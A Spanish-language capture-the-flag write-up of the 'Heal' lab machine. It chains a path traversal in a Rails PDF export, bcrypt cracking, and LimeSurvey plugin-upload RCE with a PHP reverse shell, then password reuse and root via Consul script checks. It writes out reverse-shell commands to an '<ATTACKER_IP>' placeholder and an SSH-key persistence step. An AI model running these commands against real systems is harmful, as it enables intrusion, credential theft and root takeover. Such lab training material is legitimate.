Aplicación de creación de currículums en Ruby on Rails que filtra archivos a través del endpoint de descarga de exportación a PDF, usado para leer `config/database.yml` y después la propia base de datos SQLite, volcando un hash bcrypt que se crackea hasta la contraseña de admin de LimeSurvey. RCE autenticado en LimeSurvey vía subida de plugin malicioso (PoC de Y1LD1R1M) que da una shell como `www-data`; el `config.php` de LimeSurvey revela una contraseña de base de datos reutilizada por el usuario del SO `ron`. Escalada de privilegios mediante una instancia de HashiCorp Consul ejecutándose como root con `enable_script_checks=true` y `acl_default_policy=allow` — la API `/v1/agent/check/register` del agente acepta el registro no autenticado de health checks basados en scripts, que Consul ejecuta entonces como root.

## Reconocimiento y enumeración

El objetivo de esta fase era enumerar los servicios expuestos, identificar el stack de aplicación y mapear las relaciones entre los múltiples vhosts que resultaron estar en juego.

### Escaneo de puertos

Un único escaneo combinado de Nmap cubrió todos los puertos TCP con los scripts por defecto y detección de versiones:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.129.242.228 -oA nmap.out
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
```

Dos puertos — SSH y HTTP — con el servidor HTTP devolviendo una redirección a `heal.htb`. SSH se despriorizó (la versión es actual y no había credenciales). El dominio se añadió al `/etc/hosts`:

```bash
echo "10.129.242.228 heal.htb" | sudo tee -a /etc/hosts
```

### Aplicación web — Fast Resume Builder

Navegar a `http://heal.htb/` cargó una single-page application (SPA) llamada "Fast Resume Builder" con un formulario de login y una opción de registro. Intentar crear una cuenta devolvió un mensaje de error en el frontend pero sin indicación clara de qué fallaba a nivel de red. Interceptar la petición de registro en Burp Suite era el siguiente paso obvio y reveló de inmediato algo útil:

```http
POST /signup HTTP/1.1
Host: api.heal.htb
Content-Type: application/json

{"username":"...","password":"..."}
```

La SPA hacía peticiones cross-origin a un segundo vhost — **`api.heal.htb`** — que el navegador no podía resolver porque no estaba en `/etc/hosts`. Las SPAs habitualmente separan un frontend en un vhost de una API backend en otro, y el hecho de que el bundle de JavaScript estuviera hardcodeado a un host basado en nombre (en lugar de a una ruta en el mismo origen) es la filtración que convirtió esto en un engagement multi-vhost.

```bash
echo "10.129.242.228 api.heal.htb" | sudo tee -a /etc/hosts
```

El registro tuvo éxito al segundo intento, y la interfaz autenticada presentó tres funciones: un creador de currículums con un botón "Export as PDF", una vista de perfil (con un user-ID que indicaba que yo era el segundo usuario registrado) y un enlace "Survey". Pulsar "Take the Survey" navegó a otro vhost más — **`take-survey.heal.htb`** — añadido también al hosts:

```bash
echo "10.129.242.228 take-survey.heal.htb" | sudo tee -a /etc/hosts
```

### `take-survey.heal.htb` — LimeSurvey

La encuesta en sí era un formulario de una sola pregunta que daba las gracias al usuario y no redirigía a ningún sitio interesante. La URL, sin embargo, parecía un endpoint de CMS: `/index.php/552933?lang=en`. Quitar la ruta y visitar la raíz del vhost cargó una interfaz reconocible:

```text
LimeSurvey - the free and open source survey software
[...]
Contact: ralph@heal.htb
```

Dos hallazgos a la vez: el producto es **LimeSurvey**, y hay un correo de contacto de admin — **`ralph@heal.htb`** — que insinúa un usuario del sistema llamado `ralph`. Una búsqueda rápida en Exploit-DB devolvió una PoC de RCE de LimeSurvey, pero el exploit requería autenticación previa en el panel de administración. Visitar `/admin` redirigía a `/index.php/admin/authentication/sa/login` — un login de admin de LimeSurvey estándar. Sin credenciales, esto era un callejón sin salida por el momento.

Intentar descubrir rutas ocultas con `feroxbuster` falló ruidosamente: el servidor devolvía 503 para casi cada petición, indicando un rate limiter o una trampa para arañas configurada delante de la aplicación. Volver al creador de currículums era menos arriesgado que pelearse con el WAF.

## Descubriendo el LFI

### Observando el flujo de exportación a PDF

El Server-Side Template Injection fue lo primero que probar contra los campos del currículum — pegando `{{5*5}}` y payloads similares estilo Jinja — pero nada se reflejó. El botón "Export as PDF" era más interesante porque tenía que hacer algo en el servidor: renderizar un PDF, almacenarlo en algún sitio, devolverlo al navegador. Capturando el flujo completo en Burp:

```http
POST /exports HTTP/1.1
Host: api.heal.htb
Content-Type: application/json

{ ... resume data ... }
```

La respuesta contenía un nombre de archivo. El navegador entonces emitía:

```http
OPTIONS /export?file=resume_xxx.pdf HTTP/1.1
Host: api.heal.htb
Access-Control-Request-Method: GET

GET /export?file=resume_xxx.pdf HTTP/1.1
Host: api.heal.htb
```

El preflight OPTIONS es el baile de CORS para confirmar que el navegador tiene permiso para emitir el GET; el GET en sí es donde el archivo realmente se descarga. Que el parámetro `file=` sea un nombre de archivo literal — en lugar de un ID opaco — es la misma bandera roja que en muchos bugs de directory traversal. El servidor interpola el parámetro en una ruta del sistema de archivos, y si no sanea las secuencias `../`, cualquier cosa legible por el usuario de la aplicación es accesible.

Enviar el GET a Repeater y cambiar el parámetro a `../../../../../../etc/passwd` confirmó el bug:

```http
GET /export?file=../../../../../../etc/passwd HTTP/1.1
Host: api.heal.htb

HTTP/1.1 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
[...]
ralph:x:1000:1000:,,,:/home/ralph:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Dos usuarios interesantes con shells de login: `ralph` y `ron`. El sumidero del traversal funciona; la pregunta ahora era *qué* leer.

### Identificando el stack de la API

Un simple `curl` contra la raíz de la API reveló el framework backend:

```bash
curl http://api.heal.htb
<!DOCTYPE html>
<html>
<head>
  <title>Ruby on Rails 7.1.4</title>
[...]
```

**Ruby on Rails 7.1.4**. Rails tiene una estructura de proyecto fija y bien documentada, lo que significa que un directory traversal contra una app Rails es mucho más productivo que la misma primitiva contra una aplicación a medida — el atacante sabe exactamente dónde mirar. Dos rutas importan de inmediato:

- **`config/database.yml`** — la configuración de conexión a la base de datos, incluidas las credenciales.
- **`storage/`** — la ubicación por defecto de Active Storage para bases de datos SQLite en modo desarrollo.

## Explotación

### Leyendo `database.yml`

```bash
curl -s "http://api.heal.htb/export?file=../../../../../config/database.yml"
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

production:
  <<: *default
  database: storage/development.sqlite3
```

Dos cosas a notar. La configuración usa **SQLite**, no una base de datos de red — lo que significa que toda la tabla de usuarios está en un único archivo legible a través del mismo LFI. Y la entrada `database:` del bloque `production` apunta a **`storage/development.sqlite3`** — producción apunta a la base de datos de desarrollo, presumiblemente un atajo de despliegue que dejó una huella descuidada.

### Volcando la tabla de usuarios

El archivo SQLite se descargó como un blob binario a través del LFI:

```bash
curl -s "http://api.heal.htb/export?file=../../../../../storage/development.sqlite3" -o development.sqlite3
file development.sqlite3
development.sqlite3: SQLite 3.x database
```

Consultando la tabla `users` directamente:

```bash
sqlite3 development.sqlite3 "SELECT email, password_digest FROM users;"
ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```

El prefijo `$2a$12$` lo identifica como **bcrypt** con factor de coste 12. El modo 3200 de hashcat cubre exactamente esto.

### Crackeando el hash bcrypt

El factor de coste 12 de bcrypt significa 2^12 = 4096 iteraciones de derivación de clave por intento — lento por diseño, pero aún tratable contra un diccionario que contenga la contraseña real. El benchmark del write-up original de ~25 H/s en un i7-13700K está en el rango esperado para bcrypt 12 en CPU; lo que importa es si el candidato está en rockyou, no lo rápido que sea el crackeador:

```bash
echo '$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG' > ralph.hash
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt
[...]
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:<REDACTED>
Status...........: Cracked
Speed.#1.........: 25 H/s
Recovered........: 1/1 (100.00%) Digests
```

Hash crackeado. El reflejo natural fue probar la credencial primero contra SSH:

```bash
ssh ralph@heal.htb
ralph@heal.htb's password: <REDACTED>
Permission denied, please try again.
```

SSH lo rechazó — pero la credencial era de una cuenta de **admin de LimeSurvey**, no del usuario del SO. Probando la contraseña contra el login de admin de LimeSurvey en `/index.php/admin/authentication/sa/login`:

> Welcome back, ralph

Autenticado como administrador de LimeSurvey. El bcrypt era una credencial de aplicación gestionada por Rails para la app de currículums; `ralph` la había reutilizado para su cuenta de admin de LimeSurvey. Esta es la primera de dos reutilizaciones de credenciales en esta máquina.

### RCE en LimeSurvey vía subida de plugin

El pie del panel de admin de LimeSurvey revelaba la versión — en algún punto del rango 6.x. La PoC de Exploit-DB encontrada antes apuntaba a la 5.2.4, pero la técnica es la misma en todo el rango 3.x–7.x porque la primitiva subyacente (el admin puede subir código de plugin arbitrario) no ha cambiado estructuralmente.

La PoC de **Y1LD1R1M** (`Limesurvey-RCE` en GitHub) empaqueta un `config.xml` y un archivo PHP en un zip, y luego lo sube a través de `Configuration → Plugins → Upload & install`. LimeSurvey extrae el zip en `upload/plugins/<plugin-name>/`, y el archivo PHP extraído es accesible desde la web en la URL predecible. El PHP corre bajo `www-data` porque ese es el usuario de Apache.

El `config.xml` de la PoC describe los metadatos del plugin; la única edición necesaria es añadir la versión mayor de LimeSurvey en ejecución (6.0 y 7.0 por seguridad) al bloque `<compatibility>`, de lo contrario LimeSurvey rechaza la instalación:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>Y1LD1R1M</name>
        <type>plugin</type>
        [...]
    </metadata>
    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
        <version>7.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

El archivo PHP es el script de reverse shell de `pentestmonkey` que viene con la PoC, con la IP y el puerto ajustados:

```php
<?php
set_time_limit(0);
$ip   = '<ATTACKER_IP>';
$port = 443;
[...]
```

Ambos archivos se comprimieron juntos:

```bash
zip plugin.zip config.xml php-rev.php
  adding: config.xml (deflated 57%)
  adding: php-rev.php (deflated 61%)
```

Se inició el listener:

```bash
sudo nc -lvnp 443
listening on [any] 443 ...
```

El zip se subió por la UI de admin (`Configuration → Plugins → Upload & install`), y luego el archivo PHP se disparó directamente:

```bash
curl http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php
# (sin salida; la conexión de vuelta llega al listener)
```

El listener capturó la conexión como **`www-data`**. Un cron de limpieza en la máquina borra los plugins subidos al cabo de aproximadamente un minuto, así que el disparo tiene que ocurrir rápido — no es una solución de hosting a largo plazo, solo el tiempo justo para conseguir la shell. Una mejora estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) la hizo usable.

## Foothold y movimiento lateral — `www-data` → `ron`

Lo primero que conviene buscar desde una shell de `www-data` son archivos de configuración de aplicaciones con credenciales. La configuración principal de LimeSurvey vive en `limesurvey/application/config/config.php`:

```bash
cat /var/www/limesurvey/application/config/config.php
'connectionString' => 'mysql:host=localhost;port=3306;dbname=limesurvey',
'username' => 'ralph',
'password' => '<NEW_REDACTED>',
[...]
```

Una segunda contraseña — distinta de la crackeada por bcrypt — usada para la conexión MySQL de LimeSurvey. Probarla como contraseña del sistema para `ralph` falló:

```bash
ssh ralph@heal.htb
ralph@heal.htb's password: <NEW_REDACTED>
Permission denied, please try again.
```

Pero la misma cadena funcionó contra el segundo usuario enumerado antes — `ron`:

```bash
ssh ron@heal.htb
ron@heal.htb's password: <NEW_REDACTED>
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
ron@heal:~$ cat user.txt
```

Esta es la **segunda** reutilización de credenciales en esta máquina. La contraseña de la BD MySQL usada por una instancia de LimeSurvey que `ralph` administra resultó ser la contraseña del SO de un usuario completamente distinto. La lección — las contraseñas se comparten entre servicios de formas que sus dueños frecuentemente olvidan — es la misma.

## Escalada de privilegios — `ron` → `root`

### Descubriendo Consul

Con una shell como `ron`, las comprobaciones habituales. `sudo -l` no devolvió nada útil, pero `ps aux` tenía un proceso interesante propiedad de root:

```bash
ps aux | grep -v grep | grep -E "root|consul"
root  1927  /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
```

**HashiCorp Consul** es una plataforma de service-networking — descubrimiento de servicios, health checks, almacenamiento de configuración clave-valor, service mesh. La parte "como root" es el detalle relevante: cualquier cosa que un atacante pueda convencer a Consul de ejecutar en su nombre correrá con privilegios de root.

### Leyendo la configuración de Consul

`/etc/consul.d` era el objetivo del flag `-config-dir`:

```bash
cat /etc/consul.d/config.json
{
  "bootstrap": true,
  "server": true,
  "enable_syslog": true,
  "enable_script_checks": true,
  "datacenter": "server1",
  "addresses": { "http": "127.0.0.1" },
  "bind_addr": "127.0.0.1",
  "node_name": "heal-internal",
  "data_dir": "/var/lib/consul",
  "acl_datacenter": "heal-server",
  "acl_default_policy": "allow",
  "encrypt": "l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="
}
```

Dos ajustes son individualmente arriesgados y catastróficos en combinación:

- **`"enable_script_checks": true`** — Consul soporta dos tipos de health checks: HTTP (sondear una URL) y **script** (ejecutar un comando y comprobar su código de salida). Los script checks venían deshabilitados por defecto en el Consul moderno precisamente porque son ejecución remota de código por diseño. Habilitarlos convierte la API de registro de checks del agente en una primitiva de RCE para cualquier llamante que pueda alcanzarla.
- **`"acl_default_policy": "allow"`** — el sistema de ACL de Consul por defecto permite cuando no se presenta token. Combinado con el flag anterior, esto significa que **llamantes no autenticados pueden registrar script checks**.

La API HTTP escuchando en `127.0.0.1:8500` (el valor por defecto) acepta `PUT /v1/agent/check/register` para añadir un nuevo check en el agente local. Con los script checks habilitados y sin enforcement de ACL, el cuerpo de ese PUT se convierte en un comando arbitrario a ejecutar como root.

### Confirmando el RCE a ciegas

Antes de probar una reverse shell, una confirmación ICMP a ciegas aísla la pregunta "¿se ejecuta realmente mi comando?" de la pregunta "¿puede salir mi reverse shell?". Un listener de `tcpdump` en la interfaz `tun0` del atacante filtra por ICMP:

```bash
sudo tcpdump -i tun0 icmp
```

Y en el objetivo, el registro del check malicioso:

```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/check/register \
  -d '{"Name": "deadly_check", "Args": ["/bin/bash", "-c", "ping -c 5 <ATTACKER_IP>"], "Interval": "10s"}'
```

El check se dispara cada 10 segundos. En cuestión de segundos, `tcpdump` mostró peticiones ICMP echo entrantes desde el objetivo:

```text
11:23:01.234 IP heal.htb > <ATTACKER_IP>: ICMP echo request
```

RCE confirmado. El comando corre como root porque el propio Consul corre como root, y el ejecutor de script checks hereda directamente los privilegios de su padre.

### Reverse shell con persistencia

Pasar a una reverse shell requería reemplazar el ping con un payload que llamara de vuelta a un listener. La pega es el campo **`Interval: 10s`** — el script corre cada diez segundos, lo que significa que cualquier reverse shell que lance se mata y se relanza con esa cadencia. Útil para comandos de un solo disparo; inútil para trabajo interactivo.

La solución más limpia es usar la primera invocación para depositar un backdoor persistente (una clave pública SSH en `/root/.ssh/authorized_keys`) en lugar de mantener una shell viva. El atacante genera un par de claves nuevo en local:

```bash
ssh-keygen -t rsa -f persist -N ""
Your identification has been saved in persist
Your public key has been saved in persist.pub
```

Luego registra una reverse shell de un solo disparo hacia un listener:

```bash
sudo nc -lvnp 443
listening on [any] 443 ...
```

```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/check/register \
  -d '{"Name": "deadly_check2", "Args": ["/bin/bash", "-c", "busybox nc <ATTACKER_IP> 443 -e /bin/bash"], "Interval": "10s"}'
```

Se usa `busybox nc` en lugar del `nc` a secas porque Ubuntu trae la variante de OpenBSD que no incluye `-e`. El listener capturó root en menos de diez segundos:

```text
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.129.242.228] 41082
id
uid=0(root) gid=0(root) groups=0(root)
```

Dentro de esa ventana de diez segundos, se depositó la clave persistente:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD..." >> /root/.ssh/authorized_keys
```

La shell murió según lo previsto, pero la entrada de authorized_keys era ya permanente. Volver a conectar por SSH fue el reemplazo estable:

```bash
ssh -i persist root@heal.htb
Welcome to Ubuntu 22.04.5 LTS
root@heal:~# cat root.txt
```

## Conclusiones clave

- **Las SPAs que hardcodean los hostnames de la API regalan la arquitectura.** Un frontend en `app.example.com` que consume de `api.example.com` está documentando la superficie de ataque completa en JavaScript plano. Cualquier engagement contra una SPA debería empezar interceptando una petición real en Burp y leyendo la cabecera Host de la respuesta — la mitad de las veces, hay un segundo vhost que ningún diccionario de fuerza bruta de DNS habría encontrado.
- **La identificación del framework determina la productividad del LFI.** Un directory traversal contra una aplicación desconocida da los archivos que el atacante pueda adivinar. El mismo traversal contra una app de Ruby on Rails da `config/database.yml`, `storage/`, `config/master.key`, `Gemfile.lock` y toda la estructura de proyecto fija que el framework impone. Siempre identifica el stack backend antes de decidir qué leer.
- **Que producción apunte a la base de datos de desarrollo es un anti-patrón real.** El `database.yml` por defecto de Rails separa `development`, `test` y `production` por una razón — producción nunca debería leer un archivo SQLite de desarrollo. Cuando lo hace, cada credencial insertada alguna vez durante las pruebas de desarrollo es ahora dato de producción.
- **bcrypt con coste 12 no es lo bastante lento para defender una contraseña que está en rockyou.** 25 hashes/seg en un crackeador de una sola CPU es teóricamente lento, pero las entradas más frecuentes de rockyou caen en un puñado de intentos independientemente del factor de coste. PBKDF y el coste de bcrypt son una defensa contra *adivinar la entropía de una contraseña fuerte*, no contra adivinar una contraseña común — eso requiere una política de contraseñas y filtrado contra listas de brechas, ambas en el momento de establecer la contraseña.
- **Las contraseñas de admin de aplicación y las del SO comparten un operador.** Dos reutilizaciones de credenciales en la misma máquina, ambas siguiendo el mismo patrón: una credencial de aplicación encontrada en una capa (bcrypt gestionado por Rails; config MySQL de LimeSurvey) funciona para una cuenta del SO en una capa distinta. El primer instinto tras recuperar cualquier credencial debería ser probarla contra SSH para *cada* nombre de usuario conocido, no solo para la coincidencia obvia.
- **`enable_script_checks` es el equivalente en Consul a un `eval()` por HTTP.** Cualquier servicio que documente una opción para "ejecutar un comando y comprobar su código de salida" está ofreciendo RCE como funcionalidad, y la disciplina de hardening correspondiente es asumir que la opción está habilitada salvo que se verifique explícitamente que está deshabilitada. Combinado con `acl_default_policy: allow`, produce una primitiva de RCE no autenticado contra root sobre un socket de localhost — que es exactamente el tipo de servicio interno que alcanzan los atacantes que ya se han movido lateralmente.
- **Para primitivas de RCE con intervalos cortos, la persistencia gana a la interactividad.** Una reverse shell que muere cada diez segundos es apenas usable para explorar un sistema; una clave pública depositada en `/root/.ssh/authorized_keys` durante la primera ventana de diez segundos convierte un RCE inestable en un login SSH estable. El patrón general — la primera ejecución deposita persistencia, todo el trabajo posterior usa la persistencia — aplica a cualquier canal de ejecución de código acotado en el tiempo.
